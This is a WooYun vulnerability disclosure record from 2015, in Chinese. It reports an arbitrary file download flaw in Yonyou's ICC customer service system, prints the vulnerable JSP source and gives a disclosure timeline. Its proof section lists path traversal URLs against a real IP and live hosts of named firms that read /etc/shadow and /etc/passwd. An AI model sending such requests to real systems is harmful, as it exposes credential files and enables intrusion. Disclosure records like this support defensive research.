{"id": 44937, "wybug_id": "wooyun-2015-090956", "wybug_title": "用友ICC客服系统任意文件下载漏洞影响联通人寿等", "wybug_corp": "用友软件", "wybug_author": "error", "wybug_date": "2015-01-11 12:16", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "任意文件读取"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向公众公开  简要描述： 任意文件下载 详细说明：  \n用友icc客户系统存在任意文件下载漏洞，漏洞文件common/getfile.jsp源码如下：<%@ page contentType=\"text/html;charset=UTF-8\" %><%@ page import=\"java.io.*,com.ufida.icc.util.*,java.util.*\" %><%String fullPath = \"\";String f=\"\";f = request.getParameter(\"p\");if(CommonUtil.validateParam(f)){\tf = \"\";}f = CommonUtil.filtParam(f);if(f == null || f.equals(\"\")){\tout.print(\"请传入文件名。<br>\");\treturn;}f = f.substring(f.lastIndexOf(\"/\")+1);String extName\t= f.substring(f.lastIndexOf(\".\")+1);if(extName.equals(f)){\tout.print(\"请传入正确的文件名,带后缀<br>\");\treturn;}String basePath = null;String baseUrl = null;baseUrl = SystemProperties.instance().webBaseUrl;basePath = SystemProperties.instance().webUploadPath;fullPath = basePath + f;fullPath = fullPath.replace(\"\\\\\",\"/\");String fullPathFileName = fullPath.substring(fullPath.lastIndexOf(\"/\")+1);String fullPathFile = fullPath.replace(fullPathFileName,\"\");File fileLoad = new File(fullPathFile, fullPathFileName);if(fileLoad.exists()){\tOutputStream outp = null;    FileInputStream in = null;\tString typeName = \"application/octet-stream\";\ttry{\t\toutp= response.getOutputStream();\t\tbyte b[] = new byte[1024];\t\tresponse.setHeader(\"Content-disposition\", \"attachment;filename=\" + fullPathFileName);\t\tresponse.setContentType(typeName); \t\tlong fileLength = fileLoad.length();\t\tString length = String.valueOf(fileLength);\t\tresponse.setHeader(\"Content-Length\", length);\t\tin = new FileInputStream(fileLoad);\t\tint n = 0;\t\twhile ((n = in.read(b)) != -1) {\t\t\toutp.write(b, 0, n);\t\t}\t\toutp.flush();\t}catch(Exception e){\t\tout.println(\"下载失败：\" + e.getMessage());\t}finally{\t\t if(in != null){             in.close();             in = null;         }         if(outp != null){             outp.close();             outp = null;             out.clear();             out = pageContext.pushBody();         }\t}}else{\tout.print(\"文件\"+fullPathFileName+\"不存在。<br>\");}%>\n   漏洞证明：  \n案例：http://111.75.198.122/web/icc/chat/chat?c=1&s=1\n\nhttp://111.75.198.122/web/common/getfile.jsp?p=..\\\\..\\\\..\\\\..\\\\etc\\\\shadow\n\n\n\n其他案例：中国联通在线导购客服http://help.10010.com/web/common/getfile.jsp?p=..\\\\..\\\\..\\\\..\\\\etc\\\\passwd中国联通客服http://webservice.10010.com/web/common/getfile.jsp?p=..\\\\..\\\\..\\\\..\\\\etc\\\\shadow人寿保险客服http://im.e-picc.com.cn/web/common/getfile.jsp?p=..\\\\..\\\\..\\\\..\\\\etc\\\\shadow网维游戏客服http://icc.shunwang.com/web/common/getfile.jsp?p=..\\\\..\\\\..\\\\..\\\\etc\\\\shadow\n   修复方案：  过滤   版权声明：转载请注明来源 error@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-01-12 09:47 厂商回复： 多谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-22 17:25 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n   WooYun: 用友某系统任意文件下载及一些XSS、路径泄漏等  怪不得如此眼熟？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}